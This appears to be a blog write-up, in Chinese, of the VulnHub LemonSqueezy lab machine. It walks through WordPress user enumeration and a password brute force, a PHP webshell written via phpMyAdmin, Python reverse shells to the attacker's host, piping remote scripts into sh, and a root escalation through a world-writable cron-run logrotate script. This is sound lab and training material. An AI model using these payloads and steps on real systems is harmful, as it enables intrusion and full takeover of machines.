{"title":"LemonSqueezy","date":"2023-03-01T07:42:10.000Z","date_formatted":{"ll":"Mar 1, 2023","L":"03/01/2023","MM-DD":"03-01"},"link":"2023/03/01/LemonSqueezy","tags":["vulnhub"],"updated":"2023-03-01T07:47:09.944Z","content":"<p>在 DEVCORE 實習期間打的靶機<br>\n<a href=\"https://www.vulnhub.com/entry/lemonsqueezy-1,473/\" target=\"_blank\">https://www.vulnhub.com/entry/lemonsqueezy-1,473/</a></p>\n<span id=\"more\"></span>\n<h2 id=\"思路\">思路<a title=\"#思路\" href=\"#思路\"></a></h2>\n<h3 id=\"掃-port\">掃 port<a title=\"#掃-port\" href=\"#掃-port\"></a></h3>\n<ul>\n<li>一開始先用 <code>nmap</code> 掃一下用了哪一些 port</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -p- -T5 192.168.99.191</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/qke0VsF.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"目錄爆破\">目錄爆破<a title=\"#目錄爆破\" href=\"#目錄爆破\"></a></h3>\n<ul>\n<li>之後訪問 <code>http://192.168.99.191</code> 發現是 Apache 的預設 index.html<br>\n<img src=\"https://i.imgur.com/K0eBBY8.png\" alt=\"\" loading=\"lazy\"></li>\n<li>以 <code>dirsearch</code> 進行目錄爆破<br>\n<img src=\"https://i.imgur.com/mnsXfkN.png\" alt=\"\" loading=\"lazy\"></li>\n</ul>\n<h3 id=\"brute-force\">Brute Force<a title=\"#brute-force\" href=\"#brute-force\"></a></h3>\n<ul>\n<li>訪問 <code>http://192.168.99.191/wordpress</code>會發現 css 之類的東西沒有跑出來，看一下流量可以看到是從 domain <code>lemonsqueezy</code> 抓的，因此在 <code>/etc/hosts</code> 寫入  <figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">192.168.99.191 lemonsqueezy</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><img src=\"https://i.imgur.com/3nAQjEi.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>之後訪問就正常了</li>\n<li>在目錄爆破之後可以看到把 wordpress 整個目錄備份了，下載 <code>wordpress.tar.gz</code> 可以更清楚知道在 wordpress 目錄下有哪些檔案，原本以為裡面有後門什麼的不過沒找到</li>\n<li>之後以 <code>wpscan</code> 找 username</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wpscan --url http://192.168.99.191/wordpress/ -e u</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/EUlz918.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>原理應該是在登入的時候如果輸入存在的 username 但是 password 錯誤就會噴錯，不然的話就是無效的使用者<br>\n<img src=\"https://i.imgur.com/0T0RarS.png\" alt=\"\" loading=\"lazy\"></li>\n<li>之後用 <code>rockyou.txt</code> 爆破密碼</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wpscan --url http://192.168.99.191/wordpress/ -U orange -P ~/tools/rockyou.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/U9fRV8V.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"通靈\">通靈<a title=\"#通靈\" href=\"#通靈\"></a></h3>\n<ul>\n<li>登入之後可以看到一篇文章的標題是 Keep this safe!<br>\n<img src=\"https://i.imgur.com/p3LLyBo.png\" alt=\"\" loading=\"lazy\"></li>\n<li>看起來是一個密碼，本來有試一下是不是 lemon 的密碼，不過不是</li>\n<li>回去看掃出來的目錄有 <code>phpmyadmin</code>，通靈一下覺得應該跟 <code>phpmyadmin</code> 有關<br>\n<code>username: orange, password: n0t1n@w0rdl1st!</code> 可以成功登入</li>\n</ul>\n<h3 id=\"寫入-webshell\">寫入 webshell<a title=\"#寫入-webshell\" href=\"#寫入-webshell\"></a></h3>\n<ul>\n<li>之後想說試試看能不能直接寫 webshell 到指定的目錄下</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot; INTO OUTFILE &quot;/var/www/html/wordpress/wp-content/uploads/shell.php&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/wTgwGcp.png\" alt=\"\" loading=\"lazy\"><br>\n<img src=\"https://i.imgur.com/OpkvPcY.png\" alt=\"\" loading=\"lazy\"></p>\n<h3 id=\"user.txt\">user.txt<a title=\"#user.txt\" href=\"#user.txt\"></a></h3>\n<ul>\n<li>在 <code>/var/www</code> 下有 <code>user.txt</code></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> user.txt</span><br><span class=\"line\">TXVzaWMgY2FuIGNoYW5nZSB5b3VyIGxpZmUsIH</span><br></pre></td></tr></table></figure>\n<h3 id=\"提權\">提權<a title=\"#提權\" href=\"#提權\"></a></h3>\n<ul>\n<li>之後用 <code>python</code> 打個 reverse shell 出來比較好操作</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.99.219&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>以 <code>linpeas.sh</code> 看一下有什麼東西可以利用</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/xLja15Q.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> -al /etc/logrotate.d/logrotate</span><br><span class=\"line\">-rwxrwxrwx 1 root root 230 Sep  7 18:15 /etc/logrotate.d/logrotate</span><br><span class=\"line\"></span><br><span class=\"line\">file /etc/logrotate.d/logrotate</span><br><span class=\"line\">/etc/logrotate.d/logrotate: Python script, ASCII text executable</span><br></pre></td></tr></table></figure>\n<ul>\n<li>可以看到我可以寫入 <code>logrotate</code> 並且身份可以為 root，只要找一個東西可以以 root 的身份跑就可以了，直接找 <code>crontab</code> 裡面是不是有東西可以利用</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /etc/crontab</span><br><span class=\"line\"><span class=\"comment\"># /etc/crontab: system-wide crontab</span></span><br><span class=\"line\"><span class=\"comment\"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># command to install the new version when you edit this file</span></span><br><span class=\"line\"><span class=\"comment\"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class=\"line\"><span class=\"comment\"># that none of the other crontabs do.</span></span><br><span class=\"line\"></span><br><span class=\"line\">SHELL=/bin/sh</span><br><span class=\"line\">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># m h dom mon dow user\tcommand</span></span><br><span class=\"line\">17 *\t* * *\troot    <span class=\"built_in\">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class=\"line\">25 6\t* * *\troot\t<span class=\"built_in\">test</span> -x /usr/sbin/anacron || ( <span class=\"built_in\">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class=\"line\">47 6\t* * 7\troot\t<span class=\"built_in\">test</span> -x /usr/sbin/anacron || ( <span class=\"built_in\">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class=\"line\">52 6\t1 * *\troot\t<span class=\"built_in\">test</span> -x /usr/sbin/anacron || ( <span class=\"built_in\">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class=\"line\">*/2 *   * * *   root    /etc/logrotate.d/logrotate</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/1F0oBX9.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<ul>\n<li>至此只要寫 reverse shell 到 <code>/etc/logrotate.d/logrotate</code> 就可以了</li>\n<li>寫一個 <code>reverse.sh</code></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"string\">import socket,subprocess,os</span></span><br><span class=\"line\"><span class=\"string\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span></span><br><span class=\"line\"><span class=\"string\">s.connect((&quot;192.168.99.219&quot;,4445))</span></span><br><span class=\"line\"><span class=\"string\">os.dup2(s.fileno(),0)</span></span><br><span class=\"line\"><span class=\"string\">os.dup2(s.fileno(),1)</span></span><br><span class=\"line\"><span class=\"string\">os.dup2(s.fileno(),2)</span></span><br><span class=\"line\"><span class=\"string\">import pty</span></span><br><span class=\"line\"><span class=\"string\">pty.spawn(&quot;sh&quot;)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;</span> &gt; /etc/logrotate.d/logrotate</span><br></pre></td></tr></table></figure>\n<ul>\n<li>用 <code>python3 -m http.server 8001</code> host 起來</li>\n<li><code>curl http://192.168.99.219:8001/reverse.sh | sh</code></li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /etc/logrotate.d/logrotate</span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> socket,subprocess,os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;192.168.99.219&quot;</span>,<span class=\"number\">4445</span>))</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">0</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">1</span>)</span><br><span class=\"line\">os.dup2(s.fileno(),<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">import</span> pty</span><br><span class=\"line\">pty.spawn(<span class=\"string\">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>之後聽一下 4445 port 就可以拿到 root 了<br>\n<img src=\"https://i.imgur.com/JfZaA5b.png\" alt=\"\" loading=\"lazy\"></li>\n</ul>\n<h3 id=\"root.txt\">root.txt<a title=\"#root.txt\" href=\"#root.txt\"></a></h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">ls</span></span><br><span class=\"line\">root.txt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> root.txt</span><br><span class=\"line\">NvbWV0aW1lcyBhZ2FpbnN0IHlvdXIgd2lsbC4=</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://i.imgur.com/wBNGC75.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"tsh\">tsh<a title=\"#tsh\" href=\"#tsh\"></a></h3>\n<ul>\n<li>第一次用，一開始搞了一陣子，不過還是有弄出來<br>\n<img src=\"https://i.imgur.com/yAV63G0.png\" alt=\"\" loading=\"lazy\"></li>\n</ul>\n","prev":{"title":"CVE-2021-3129","link":"2023/03/01/CVE-2021-3129"},"next":{"title":"DevGuru","link":"2023/03/01/DevGuru"},"plink":"https://entroychang.github.io/2023/03/01/LemonSqueezy/","toc":[{"id":"思路","title":"思路","index":"1","children":[{"id":"掃-port","title":"掃 port","index":"1.1"},{"id":"目錄爆破","title":"目錄爆破","index":"1.2"},{"id":"brute-force","title":"Brute Force","index":"1.3"},{"id":"通靈","title":"通靈","index":"1.4"},{"id":"寫入-webshell","title":"寫入 webshell","index":"1.5"},{"id":"user.txt","title":"user.txt","index":"1.6"},{"id":"提權","title":"提權","index":"1.7"},{"id":"root.txt","title":"root.txt","index":"1.8"},{"id":"tsh","title":"tsh","index":"1.9"}]}],"reading_time":"1038 words in 7 min"}